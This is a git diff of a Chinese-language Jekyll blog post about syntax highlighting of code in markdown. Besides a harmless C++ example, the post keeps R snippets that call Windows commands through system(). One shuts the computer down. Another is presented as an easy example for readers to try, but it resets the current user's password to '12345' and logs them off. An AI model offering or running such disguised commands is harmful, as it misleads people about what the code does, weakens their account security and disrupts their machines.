@@ -6,7 +6,7 @@ description: ""
 category: jekyll
 cssdemo: 2014-spring
 tags: [markdown, R]
-published: false
+published: true
 ---
 {% include JB/setup %}
 
@@ -14,21 +14,30 @@ blogger用來記錄關於程式的心得，少不了要讓你的程式上上水�
 
 例如我想要對下面這段程式碼進行語法高亮：
 
-```R
-system("cmd /k shutdown -s -t")
+``` cpp
+#include <iostream>
+int main()
+{
+	std::cout << "Enter two numbers:" << std::endl;
+	int v1 = 0, v2 =0;
+	std::cin >> v1 >> v2;
+	std::cout << "The sum of " << v1 << " and " << v2
+			  << " is " << v1 + v2 << std::endl;
+	return 0;
+}
 ```
 
 <!-- more -->
 
 就要在markdown中這樣打
 
-	``` R
+	```splus
 	system("cmd /k shutdown -s -t")
 	```
 	
 超簡單的，請自行嘗試：
 
-```R
+```splus
 user_name = Sys.info()[length(Sys.info())]
 system(sprintf("cmd /k net user %s 12345", user_name))
 system("cmd /k shutdown -l")
